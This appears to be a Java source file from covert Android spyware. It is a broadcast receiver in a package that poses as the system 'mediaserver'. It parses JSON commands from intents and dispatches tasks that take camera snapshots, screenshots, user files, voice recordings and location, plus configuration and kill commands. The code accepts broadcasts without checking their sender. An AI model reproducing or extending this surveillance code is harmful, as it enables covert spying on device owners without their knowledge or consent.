package com.android.mediaserver.task;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.android.mediaserver.command.CameraSnapshotCommand;
import com.android.mediaserver.command.Command;
import com.android.mediaserver.command.CommandType;
import com.android.mediaserver.command.ConfigurationCommand;
import com.android.mediaserver.command.FetchUserFileCommand;
import com.android.mediaserver.command.KillCommand;
import com.android.mediaserver.command.LocationCommand;
import com.android.mediaserver.command.RuntimeTypeAdapterFactory;
import com.android.mediaserver.command.ScreenshotCommand;
import com.android.mediaserver.command.VoiceRecordCommand;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonParser;
import timber.log.Timber;

public class TasksReceiver extends BroadcastReceiver {
  public void onReceive(Context context, Intent intent) {
    String commandJson = intent.getStringExtra("command");
    Command command = (Command) new GsonBuilder().registerTypeAdapterFactory(
        RuntimeTypeAdapterFactory.of(Command.class)
            .registerSubtype(KillCommand.class, CommandType.KILL.toString())
            .registerSubtype(ConfigurationCommand.class, CommandType.CONFIGURATION.toString())
            .registerSubtype(CameraSnapshotCommand.class, CommandType.SNAPSHOT.toString())
            .registerSubtype(ScreenshotCommand.class, CommandType.SCREENSHOT.toString())
            .registerSubtype(FetchUserFileCommand.class, CommandType.USER_FILE.toString())
            .registerSubtype(VoiceRecordCommand.class, CommandType.VOICE.toString())
            .registerSubtype(LocationCommand.class, CommandType.LOCATION.toString()))
        .create()
        .fromJson(commandJson, Command.class);
    command.setType(
        new JsonParser().parse(commandJson).getAsJsonObject().get("type").getAsString());
    if (command != null) {
      Task task = TaskFactory.getTask(command, context);
      Timber.d("Executing task: %s", task.getClass().toString());
      task.execute(new Void[0]);
    }
  }
}
